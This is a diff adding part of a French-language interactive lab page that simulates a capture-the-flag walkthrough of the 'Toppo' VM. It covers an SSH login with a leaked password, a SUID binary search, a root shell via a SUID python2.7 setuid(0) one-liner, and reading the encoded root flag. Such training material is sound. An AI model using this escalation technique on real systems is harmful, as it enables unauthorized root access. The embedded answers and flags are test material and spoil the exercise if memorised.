+        {t:"Warning: Permanently added '192.168.56.102' (ED25519) to the list of known hosts.", c:"o"},
+        {t:"ted@192.168.56.102's password: ", c:"o"}
+      ] },
+
+    { kind:"type", phase:"exploitation", context:"kali@kali", prompt:"", mask:true,
+      task:"Saisis le mot de passe de ted trouvé dans notes.txt.",
+      accepted:["12345ted123"],
+      hint:"C'est le mot de passe repéré dans le fichier notes.txt à l'étape précédente.",
+      hint2:"12345ted123",
+      note:"La saisie du mot de passe n'est jamais affichée en clair dans un vrai terminal SSH.",
+      output:[
+        {t:"Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY.", c:"o"},
+        {t:"Last login: Sun Apr 15 12:33:00 2018 from 192.168.0.29", c:"o"}
+      ] },
+
+    { kind:"type", phase:"post-exploitation", context:"ted@Toppo", prompt:"$",
+      task:"Cherche les binaires SUID sur la machine.",
+      accepted:["find / -perm -4000 -type f 2>/dev/null"],
+      hint:"find / -perm -4000 -type f, avec 2>/dev/null pour cacher les erreurs de permission.",
+      hint2:"find / -perm -4000 -type f 2>/dev/null",
+      note:"find / -perm -4000 -type f 2>/dev/null → liste tous les binaires SUID root.",
+      output:[
+        {t:"/sbin/mount.nfs", c:"o"},
+        {t:"/usr/sbin/exim4", c:"o"},
+        {t:"/usr/lib/eject/dmcrypt-get-device", c:"o"},
+        {t:"/usr/lib/dbus-1.0/dbus-daemon-launch-helper", c:"o"},
+        {t:"/usr/lib/openssh/ssh-keysign", c:"o"},
+        {t:"/usr/bin/gpasswd", c:"o"},
+        {t:"/usr/bin/newgrp", c:"o"},
+        {t:"/usr/bin/python2.7", c:"flag", id:"hl-suid"},
+        {t:"/usr/bin/chsh", c:"o"},
+        {t:"/usr/bin/at", c:"o"},
+        {t:"/usr/bin/mawk", c:"o"},
+        {t:"/usr/bin/chfn", c:"o"},
+        {t:"/usr/bin/procmail", c:"o"},
+        {t:"/usr/bin/passwd", c:"o"},
+        {t:"/bin/su", c:"o"},
+        {t:"/bin/umount", c:"o"},
+        {t:"/bin/mount", c:"o"}
+      ] },
+
+    { kind:"type", phase:"post-exploitation", context:"ted@Toppo", prompt:"$",
+      task:"Exploite le SUID anormal pour obtenir un shell root.",
+      accepted:["python2.7 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"],
+      hint:"Utilise python2.7 avec -c et une commande qui appelle setuid(0) puis lance /bin/bash.",
+      hint2:"python2.7 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+      note:"Un interpréteur SUID root permet de forcer setuid(0) et de lancer un shell root.",
+      output:[
+        {t:"root@Toppo:~# ", c:"ok"},
+        {t:"uid=0(root) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)", c:"ok"}
+      ] },
+
+    { kind:"type", phase:"post-exploitation", context:"root@Toppo", prompt:"#",
+      task:"Lis le flag final.",
+      accepted:["cat /root/flag.txt"],
+      hint:"cat + le chemin du fichier dans /root/.",
+      hint2:"cat /root/flag.txt",
+      note:"Le flag final est dans /root/flag.txt.",
+      output:[
+        {t:"_________                                  ", c:"flag"},
+        {t:"|  _   _  |                                 ", c:"flag"},
+        {t:"|_/ | | \\_|.--.   _ .--.   _ .--.    .--.   ", c:"flag"},
+        {t:"    | |  / .'`\\ \\[ '/'`\\ \\[ '/'`\\ \\/ .'`\\ \\ ", c:"flag"},
+        {t:"   _| |_ | \\__. | | \\__/ | | \\__/ || \\__. | ", c:"flag"},
+        {t:"  |_____| '.__.'  | ;.__/  | ;.__/  '.__.'  ", c:"flag"},
+        {t:"                 [__|     [__|              ", c:"flag"},
+        {t:"", c:"flag"},
+        {enc:"Q29uZ3JhdHVsYXRpb25zICEgdGhlcmUgaXMgeW91ciBmbGFnIDogMHduZWRsYWJ7cDRzc2kwbl9jMG1lX3dpdGhfcHJhY3QxY2V9", c:"flag"}
+      ] }
+  ];
+
+  let freeContext = "root@Toppo";
+  const freeCommands = {
+    "root@Toppo": {
+      "whoami": [{t:"root", c:"ok"}],
+      "id": [{t:"uid=0(root) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)", c:"ok"}],
+      "ls /root/": [
+        {t:"flag.txt  .bashrc  .profile", c:"o"}
+      ],
+      "ls -la /root/": [
+        {t:"total 24", c:"o"},
+        {t:"drwx------  2 root root 4096 Apr 15  2018 .", c:"o"},
+        {t:"drwxr-xr-x 21 root root 4096 Apr 15  2018 ..", c:"o"},
+        {t:"-rw-------  1 root root   53 Apr 15  2018 .bash_history", c:"o"},
+        {t:"-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc", c:"o"},
+        {t:"-rw-r--r--  1 root root  397 Apr 15  2018 flag.txt", c:"o"},
+        {t:"-rw-r--r--  1 root root  140 Nov 19  2007 .profile", c:"o"}
+      ],
+      "cat /root/flag.txt": [
+        {enc:"MHduZWRsYWJ7cDRzc2kwbl9jMG1lX3dpdGhfcHJhY3QxY2V9", c:"flag"}
+      ],
+      "uname -a": [
+        {t:"Linux Toppo 3.16.0-4-586 #1 Debian 3.16.51-3 (2017-12-13) i686 GNU/Linux", c:"o"}
+      ],
+      "cat /etc/issue": [
+        {t:"Debian GNU/Linux 8 \\n \\l", c:"o"}
+      ],
+      "hostname -I": [
+        {t:"192.168.56.102", c:"o"}
+      ],
+      "ls -la /etc/cron*": [
+        {t:"-rw-r--r-- 1 root root  722 Jun  7  2015 /etc/crontab", c:"o"},
+        {t:"", c:"o"},
+        {t:"/etc/cron.d:", c:"o"},
+        {t:"total 20", c:"o"},
+        {t:"drwxr-xr-x  2 root root 4096 Apr 15  2018 .", c:"o"},
+        {t:"drwxr-xr-x 90 root root 4096 Apr 15  2018 ..", c:"o"},
+        {t:"-rw-r--r--  1 root root  244 Dec 28  2014 anacron", c:"o"},
+        {t:"-rw-r--r--  1 root root  661 Jan  5  2018 php5", c:"o"},
+        {t:"-rw-r--r--  1 root root  102 Jun  7  2015 .placeholder", c:"o"},
+        {t:"", c:"o"},
+        {t:"/etc/cron.daily:", c:"o"},
+        {t:"total 72", c:"o"},
+        {t:"drwxr-xr-x  2 root root 4096 Apr 15  2018 .", c:"o"},
+        {t:"drwxr-xr-x 90 root root 4096 Apr 15  2018 ..", c:"o"},
+        {t:"-rwxr-xr-x  1 root root  311 Dec 28  2014 0anacron", c:"ok"},
+        {t:"-rwxr-xr-x  1 root root  625 Mar 31  2018 apache2", c:"ok"},
+        {t:"-rwxr-xr-x  1 root root 15000 Dec 11  2016 apt", c:"ok"},
+        {t:"-rwxr-xr-x  1 root root  314 Nov  8  2014 aptitude", c:"ok"},
+        {t:"-rwxr-xr-x  1 root root  355 Oct 17  2014 bsdmainutils", c:"ok"},
+        {t:"-rwxr-xr-x  1 root root 1597 May  2  2016 dpkg", c:"ok"},
+        {t:"-rwxr-xr-x  1 root root 4125 Feb 10  2018 exim4-base", c:"ok"},
+        {t:"-rwxr-xr-x  1 root root   89 Nov  8  2014 logrotate", c:"ok"},
+        {t:"-rwxr-xr-x  1 root root 1293 Dec 31  2014 man-db", c:"ok"},
+        {t:"-rwxr-xr-x  1 root root  435 Jun 13  2013 mlocate", c:"ok"},
+        {t:"-rwxr-xr-x  1 root root  249 May 17  2017 passwd", c:"ok"},
+        {t:"-rw-r--r--  1 root root  102 Jun  7  2015 .placeholder", c:"o"},
+        {t:"", c:"o"},
+        {t:"/etc/cron.hourly:", c:"o"},
+        {t:"total 12", c:"o"},
+        {t:"drwxr-xr-x  2 root root 4096 Apr 15  2018 .", c:"o"},
+        {t:"drwxr-xr-x 90 root root 4096 Apr 15  2018 ..", c:"o"},
+        {t:"-rw-r--r--  1 root root  102 Jun  7  2015 .placeholder", c:"o"}
+      ],
+      "history": [
+        {t:"    1  whoami", c:"o"},
+        {t:"    2  id", c:"o"},
+        {t:"    3  uname -a", c:"o"},
+        {t:"    4  ls -la /root/", c:"o"},
+        {t:"    5  cat /root/flag.txt", c:"o"},
+        {t:"    6  history", c:"o"}
+      ],
+      "exit": {t:"logout", c:"o"}
+    }
+  };
+
+  let freeHintHtml = "Session root ouverte. Tape <strong style=\"color:#e0c060\">whoami</strong>, <strong style=\"color:#e0c060\">id</strong>, <strong style=\"color:#e0c060\">uname -a</strong>, <strong style=\"color:#e0c060\">ls -la /etc/cron*</strong> ou <strong style=\"color:#e0c060\">cat /root/flag.txt</strong>.";
+</script>
+<script src="engine.js?v=4"></script>
+
+</body>
+</html>
